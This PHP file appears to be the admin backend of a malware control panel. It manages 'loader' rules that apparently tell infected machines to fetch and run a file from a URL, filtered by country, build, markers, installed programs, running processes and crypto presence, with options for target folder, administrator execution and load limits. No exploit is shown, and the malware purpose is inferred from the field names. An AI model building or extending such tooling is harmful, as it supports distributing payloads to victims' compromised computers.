<?php

include_once "../../config.php";
include_once "../app/functions.php";
include_once "../app/managers/AccountManager.php";

session_start();
header('Content-Type: application/json; charset=utf-8');

$link = ConnectDB();

$accountManager = new AccountManager($link);
$accountManager->CheckAuth();

$is_admin = ($_SESSION['user_group'] === 'Administrator') ? 1 : 0;

if(!$is_admin)
{
    echo json_encode(['error' => 'do not have permission to use this method']);
    exit();
}

$method                 = isset($_POST["method"]) ? $_POST["method"] : null;

$page                   = isset($_POST["page"]) ? $_POST["page"] : 1;
$draw                   = isset($_POST['draw']) ? intval($_POST['draw']) : 0;
$start                  = isset($_POST['start']) ? intval($_POST['start']) : 0;
$length                 = isset($_POST['length']) ? intval($_POST['length']) : 10;

$loader_id              = isset($_POST['loader_id']) ? intval($_POST['loader_id']) : 0;
$rule_active            = isset($_POST["rule_active"]) ? $_POST["rule_active"] : null;

$rule_name              = isset($_POST["rule_name"]) ? $_POST["rule_name"] : null;
$rule_url               = isset($_POST["rule_url"]) ? $_POST["rule_url"] : null;
$rule_geo               = isset($_POST["rule_geo"]) ? $_POST["rule_geo"] : null;
$rule_builds            = base64_decode($_POST["rule_builds"]);
$rule_markers           = base64_decode($_POST["rule_markers"]);
$rule_programs          = base64_decode($_POST["rule_programs"]);
$rule_process           = base64_decode($_POST["rule_process"]);
$rule_csidl             = isset($_POST['rule_csidl']) ? intval($_POST['rule_csidl']) : 0;
$rule_admin             = isset($_POST['rule_admin']) ? intval($_POST['rule_admin']) : 0;
$rule_limit             = isset($_POST['rule_limit']) ? intval($_POST['rule_limit']) : 0;
$rule_type              = isset($_POST['rule_type']) ? intval($_POST['rule_type']) : 0;
$rule_crypto            = isset($_POST['rule_crypto']) ? intval($_POST['rule_crypto']) : 0;

/**
 * check actions
 */
if($method != null)
{
    switch($method)
    {
        case "get_rules":
            getRules($page, $draw, $start, $length);
            break;

        case "change_status":
            ChangeStatus($loader_id, $rule_active);
            break;

        case "delete_rule":
            DeleteRule($loader_id);
            break;

        case "get_info":
            getInfoForCreateRule();
            break;

        case "add_rule":
            CreateRule($rule_name, $rule_url, $rule_geo, $rule_builds, $rule_markers, $rule_csidl, $rule_admin, $rule_limit, $rule_type, $rule_programs, $rule_process, $rule_crypto);
            break;

        default:
            echo json_encode(['error' => 'Unknown method']);
            exit(0);
            break;
    }
}

function getRules($page, $draw, $start, $length) 
{
    $link = ConnectDB();
    
    $conditions = [];
    
    $whereClause = '';
    if (!empty($conditions)) {
        $whereClause = ' WHERE ' . implode(' AND ', $conditions);
    }
    
    $countQuery = "SELECT COUNT(*) AS total FROM `loader`" . $whereClause;
    $countResult = $link->query($countQuery);
    $totalRecords = 0;
    if ($countResult) {
        $row = $countResult->fetch_assoc();
        $totalRecords = (int)$row['total'];
    }
    
    $limitStart = $start;
    $limitCount = (int)$length;
    
    $query = "SELECT * FROM `loader`" . $whereClause . " ORDER BY `loader_id` DESC LIMIT {$limitStart}, {$limitCount}";
    $result = $link->query($query);
    
    $data = [];
    while ($row = $result->fetch_assoc()) 
    {
        $data[] = [
            'loader_id'             => $row['loader_id'],
            'active'                => $row['active'],
            'name'                  => $row['name'],
            'url'                   => $row['url'],
            'geo'                   => $row['geo'],
            'builds'                => $row['builds'],
            'markers'               => $row['markers'],
            'programs'              => $row['programs'],
            'process'               => $row['process'],
            'csidl'                 => $row['csidl'],
            'run_as_admin'          => $row['run_as_admin'],
            'type'                  => $row['type'],
            'load_limit'            => $row['load_limit'],
            'count'                 => $row['count']
        ];
    }
    
    $total_pages = ($limitCount > 0) ? ceil($totalRecords / $limitCount) : 0;
    
    $response = [
        "draw"            => $draw,
        "recordsTotal"    => $totalRecords,
        "recordsFiltered" => $totalRecords,
        "current_page"    => $page,
        "total_pages"     => $total_pages,
        "data"            => $data
    ];
    
    echo json_encode($response);
    exit();
}

function ChangeStatus($loader_id, $rule_active)
{
    $link = ConnectDB();
    
    if (empty($loader_id) || !isset($rule_active)) 
    {
        echo json_encode(['error' => 'No rule ID or active status provided']);
        exit();
    }
    
    $stmt = $link->prepare("UPDATE loader SET active = ? WHERE loader_id = ?");
    
    if (!$stmt) 
    {
        echo json_encode(['error' => 'Error preparing UPDATE statement: ' . $link->error]);
        exit();
    }
    
    $stmt->bind_param("ii", $rule_active, $loader_id);
    
    if (!$stmt->execute()) 
    {
        echo json_encode(['error' => 'Error executing UPDATE: ' . $stmt->error]);
        exit();
    }
    
    if ($stmt->affected_rows === 0) 
    {
        echo json_encode(['error' => 'No rule found with provided ID']);
        exit();
    }
    
    $stmt->close();
    
    echo json_encode(['success' => 'Loader rule status updated']);
    exit();
}

function DeleteRule($loader_id)
{
    $link = ConnectDB();
    
    if (empty($loader_id)) 
    {
        echo json_encode(['error' => 'No loader_id provided']);
        exit();
    }
    
    $stmt = $link->prepare("DELETE FROM loader WHERE loader_id = ?");

    if (!$stmt) 
    {
        echo json_encode(['error' => 'Error preparing DELETE statement: ' . $link->error]);
        exit();
    }
    
    $stmt->bind_param("i", $loader_id);

    if (!$stmt->execute()) 
    {
        echo json_encode(['error' => 'Error executing DELETE: ' . $stmt->error]);
        exit();
    }
    
    if ($stmt->affected_rows === 0) 
    {
        echo json_encode(['error' => 'No rule found with provided ID']);
        exit();
    }
    
    $stmt->close();
    
    echo json_encode(['success' => 'Loader rule deleted']);
    exit();
}

function getInfoForCreateRule()
{
    $link = ConnectDB();

    $_builds = array();
    $builds = $link->query("SELECT name FROM builds;");
    
    while ($build = $builds->fetch_assoc())
    {
        $_builds[] = array(
            "id"   => $build['name'],
            "text" => $build['name'],
        );
    }

    $_markers = array();
    $markers = $link->query("SELECT name FROM markers;");
    
    while ($marker = $markers->fetch_assoc())
    {
        $_markers[] = array(
            "id"   => $marker['name'],
            "text" => $marker['name'],
        );
    }

    $response = [
        "builds"                => $_builds,
        "markers"               => $_markers
    ];

    echo json_encode($response);
    exit();
}

function CreateRule($rule_name, $rule_url, $rule_geo, $rule_builds, $rule_markers, $rule_csidl, $rule_admin, $rule_limit, $rule_type, $rule_programs, $rule_process, $rule_crypto)
{
    $link = ConnectDB();

    if(isset($rule_geo))
    {
        $rule_geo = implode(',', $rule_geo);
    }

    $stmt = $link->prepare("INSERT INTO `loader`(`active`, `name`, `url`, `geo`, `builds`, `markers`, `csidl`, `run_as_admin`, `load_limit`, `count`, `type`, `programs`, `process`, `crypto`) VALUES (1, ?, ?, ?, ?, ?, ?, ?, ?, 0, ?, ?, ?, ?)");
    
    if (!$stmt) 
    {
        $stmt->close();
        echo json_encode(['error' => 'Error preparing SELECT: ' . $link->error]);
        exit();
    }
    
    $stmt->bind_param("sssssiiiissi", $rule_name, $rule_url, $rule_geo, $rule_builds, $rule_markers, $rule_csidl, $rule_admin, $rule_limit, $rule_type, $rule_programs, $rule_process, $rule_crypto);
    
    if ($stmt->execute()) 
    {
        echo json_encode(['success' => 'Loader rule created']);
        $stmt->close();
        exit();
    } 
    else
    {
        echo json_encode(['error' => 'Error adding loader rule']);
        $stmt->close();
        exit();
    }
    $stmt->close();
}

?>